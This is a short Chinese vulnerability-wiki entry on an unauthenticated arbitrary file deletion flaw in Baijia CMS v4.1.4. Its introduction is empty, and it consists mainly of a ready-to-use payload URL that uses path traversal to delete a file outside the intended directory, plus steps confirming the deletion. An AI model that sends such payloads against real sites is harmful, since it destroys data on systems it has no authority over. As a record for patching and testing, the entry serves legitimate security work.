百家cms v4.1.4 任意文件删除漏洞
===============================

一、漏洞简介
------------

二、漏洞影响
------------

百家cms v4.1.4

三、复现过程
------------

    # payload
    # 不需要后台权限
    # 只能删除文件，不能删除文件夹

    http://www.0-sec.org/index.php?mod=mobile&act=uploader&op=post&do=util&m=eshop&op=remove&file=../qwe.txt

设置里需要选择本地，否则删除的不是本地文件

![](/Users/aresx/Documents/VulWiki/.resource/百家cmsv4.1.4任意文件删除漏洞/media/rId24.png)

先在根目录下创建qwe.txt作为测试文件

![](/Users/aresx/Documents/VulWiki/.resource/百家cmsv4.1.4任意文件删除漏洞/media/rId25.png)

访问payload

![](/Users/aresx/Documents/VulWiki/.resource/百家cmsv4.1.4任意文件删除漏洞/media/rId26.png)

查看文件，已经被删除

![](/Users/aresx/Documents/VulWiki/.resource/百家cmsv4.1.4任意文件删除漏洞/media/rId27.png)

参考链接
--------

> https://xz.aliyun.com/t/7542
